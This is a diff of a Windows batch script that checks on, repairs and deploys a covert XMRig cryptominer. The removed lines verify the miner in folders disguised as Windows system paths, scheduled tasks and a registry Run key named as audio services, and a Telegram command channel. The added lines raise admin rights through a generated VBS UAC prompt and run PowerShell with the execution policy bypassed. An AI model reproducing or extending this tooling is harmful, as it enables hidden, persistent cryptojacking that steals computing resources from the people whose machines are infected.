@@ -1,66 +1,69 @@
 @echo off
-title Quick Status Check
+title System Status Check & Repair - FIXED VERSION
+color 0A
+
+echo.
 echo =====================================================
-echo    BEAST MODE ULTIMATE - STATUS CHECK
+echo   UNIVERSAL MINER STATUS CHECK & REPAIR
 echo =====================================================
 echo.
 
-echo [1] Checking XMRig Process...
-tasklist /fi "imagename eq xmrig.exe" | find /i "xmrig.exe" >nul
-if %errorlevel%==0 (
-    echo ✅ XMRig is running
-    for /f "tokens=2" %%i in ('tasklist /fi "imagename eq xmrig.exe" ^| find /i "xmrig.exe"') do echo    Process ID: %%i
-) else (
-    echo ❌ XMRig is NOT running
+REM Check if running as admin
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' neq '0' (
+    echo [!] Requesting admin privileges for repair...
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
+    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
+    cscript //NoLogo "%temp%\elevate.vbs"
+    del "%temp%\elevate.vbs" >nul 2>&1
+    exit /b
 )
+
+echo [✓] Running with admin privileges
 echo.
 
-echo [2] Checking Process Count...
-for /f %%i in ('tasklist /fi "imagename eq xmrig.exe" ^| find /c "xmrig.exe"') do (
-    if %%i==1 (
-        echo ✅ Single instance confirmed %%i process
-    ) else if %%i==0 (
-        echo ❌ No processes running
-    ) else (
-        echo ⚠️  Multiple instances detected: %%i processes
-    )
-)
+REM Check what to do
+echo What would you like to do?
 echo.
-
-echo [3] Checking Deployment Locations...
-set count=0
-for %%L in ("C:\ProgramData\Microsoft\Windows\WindowsUpdate" "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv" "C:\ProgramData\Microsoft\Network\Downloader") do (
-    if exist "%%L\xmrig.exe" (
-        echo ✅ Found at: %%L
-        set /a count+=1
-    )
-)
-echo    Total locations: %count%/3 main locations
+echo [1] Quick Status Check Only
+echo [2] Status Check + Auto Repair
+echo [3] Full Deployment (Universal Launcher)
 echo.
+set /p choice="Enter your choice (1-3): "
 
-echo [4] Checking Scheduled Tasks...
-schtasks /query /tn "WindowsAudioSrv" >nul 2>&1
-if %errorlevel%==0 (echo ✅ Startup task exists) else (echo ❌ Startup task missing)
+if "%choice%"=="1" goto :status_only
+if "%choice%"=="2" goto :status_repair
+if "%choice%"=="3" goto :full_deployment
+goto :status_repair
 
-schtasks /query /tn "SystemHostAudio" >nul 2>&1  
-if %errorlevel%==0 (echo ✅ Logon task exists) else (echo ❌ Logon task missing)
+:status_only
 echo.
+echo [*] Running status check only...
+powershell.exe -ExecutionPolicy Bypass -Command "& '%~dp0status_checker_fixed.ps1'"
+goto :end
 
-echo [5] Checking Registry Entries...
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudioService" >nul 2>&1
-if %errorlevel%==0 (echo ✅ Registry startup entry exists) else (echo ❌ Registry startup missing)
+:status_repair
 echo.
+echo [*] Running status check with auto-repair...
+powershell.exe -ExecutionPolicy Bypass -Command "& '%~dp0status_checker_fixed.ps1' -Repair"
+goto :end
 
-echo [6] Checking API Connection...
-powershell -Command "try { $response = Invoke-RestMethod -Uri 'http://127.0.0.1:16000/1/summary' -TimeoutSec 3; if ($response.hashrate.total) { Write-Host '✅ API accessible - Hashrate:' $response.hashrate.total[0] 'H/s' } else { Write-Host '⚠️ API accessible but no hashrate data' } } catch { Write-Host '❌ API not accessible' }"
+:full_deployment
 echo.
+echo [*] Launching Universal Launcher for full deployment...
+start "" "%~dp0UNIVERSAL_LAUNCHER.bat"
+goto :end
 
-echo [7] Checking CPU Usage...
-powershell -Command "try { $cpu = (Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue; Write-Host '📊 CPU Usage:' ([math]::Round($cpu,1))'%' } catch { Write-Host '❌ Cannot read CPU usage' }"
+:end
 echo.
-
 echo =====================================================
-echo Status check complete. 
-echo Send "/status beast2025" via Telegram for detailed info.
+echo   STATUS CHECK COMPLETED
 echo =====================================================
+echo.
+echo 💡 Next steps:
+echo     • If issues found: Run option 2 to auto-repair
+echo     • For full setup: Run UNIVERSAL_LAUNCHER.bat as admin  
+echo     • For mining: Choose Option 1, 6, or 7 in Universal Launcher
+echo     • The PowerShell syntax error has been FIXED!
+echo.
 pause
